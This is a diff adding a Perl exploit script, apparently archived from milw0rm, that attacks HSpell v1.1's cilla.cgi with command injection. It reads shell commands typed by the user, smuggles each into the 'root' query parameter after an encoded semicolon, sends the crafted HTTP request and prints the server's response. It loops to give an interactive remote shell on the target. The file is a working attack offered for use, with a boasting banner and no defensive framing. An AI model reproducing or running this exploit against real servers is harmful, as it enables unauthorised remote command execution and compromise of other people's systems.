@@ -1,0 +1,53 @@
+#!/usr/bin/perl
+use IO::Socket;
+
+print q{
+
+HSpell v1.1 Command Execution Exploit
+
+Theres a 1000 ways to improve this exploit,
+but I really couldn't be fucked with it.
+
+Made By ZeN
+http://dusecurity.com/
+http://darkcode.me/
+
+};
+
+
+$host = 'site.com';
+$port = '80';
+$path = '/cgi-bin/cilla.cgi';
+
+ShellMe:
+
+print "\nh4x0r~> ";
+$cmd = <stdin>;
+chop ($cmd);
+
+$cmd =~ s/\ /+/g;
+
+
+$header = "GET ".$path."?root=pwnt%3B+".$cmd."&binyan=%F7%EC HTTP/1.1\r\n";
+$header = $header."Host: ".$host."\r\n";
+$header = $header."User-Agent: DUSecurity Group\r\n";
+$header = $header."Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n";
+$header = $header."Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n";
+$header = $header."Accept-Encoding: gzip,deflate\r\n";
+$header = $header."Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n";
+$header = $header."Connection: close\r\n";
+$header = $header."Cache-Control: max-age=0\r\n";
+$header = $header."\r\n";
+
+
+$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "$port") || print "[*] Error!\n";
+print $get1 $header;
+$get1->recv($buffer,50000);
+
+$shell = substr($buffer, 1347);
+
+print $shell;
+
+goto ShellMe;
+
+# milw0rm.com [2009-01-13]
